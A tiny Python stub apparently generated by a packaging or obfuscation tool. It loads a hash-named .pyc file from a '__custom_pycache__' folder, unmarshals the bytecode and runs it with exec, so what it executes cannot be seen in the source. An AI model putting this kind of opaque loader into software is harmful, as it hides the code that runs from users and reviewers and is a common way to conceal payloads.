
import marshal
import os

s = open(os.path.join(os.path.dirname(os.path.realpath(__file__)), '__custom_pycache__', 'Image_a69201b6ce84473584e76569f854ed4f.cpython-xxx.pyc'), 'rb')
s.seek(16)
exec(marshal.load(s))
